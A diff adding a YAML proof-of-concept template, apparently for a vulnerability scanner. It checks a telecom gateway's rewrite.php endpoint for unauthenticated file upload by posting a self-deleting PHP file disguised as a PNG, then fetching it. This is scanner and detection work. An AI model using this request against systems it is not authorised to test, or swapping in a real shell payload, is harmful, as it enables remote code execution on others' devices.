@@ -1,0 +1,37 @@
+name: poc-yaml-dianxin-wg-rewrite-file-upload
+transport: http
+     
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /manager/teletext/material/rewrite.php
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
+      body: "\
+        ------WebKitFormBoundaryOKldnDPT\r\n\
+        Content-Disposition: form-data; name=\"tmp_name\"; filename=\"test.php\"\r\n\
+        Content-Type: image/png\r\n\
+        \r\n\
+        <?php print(111*222);unlink(__FILE__);?>\r\n\
+        ------WebKitFormBoundaryOKldnDPT\r\n\
+        Content-Disposition: form-data; name=\"uploadtime\"\r\n\
+        \r\n\
+        \r\n\
+        ------WebKitFormBoundaryOKldnDPT--\r\n\
+        "
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /xmedia/material/test.php
+    expression: response.status == 200 && response.body.bcontains(b'24642')
+expression: r0() && r1()
+
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139313315
